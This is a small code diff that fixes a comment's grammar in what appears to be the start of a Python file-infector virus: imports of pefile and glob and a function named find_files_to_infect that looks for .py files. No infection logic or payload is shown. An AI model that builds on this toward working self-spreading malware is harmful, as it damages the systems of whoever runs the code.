@@ -1,7 +1,7 @@
 import pefile
 import glob
 
-# Find file to infect why is python file (*.py)
+# Find file to infect which is python file (*.py)
 
 
 def find_files_to_infect(directory="."):
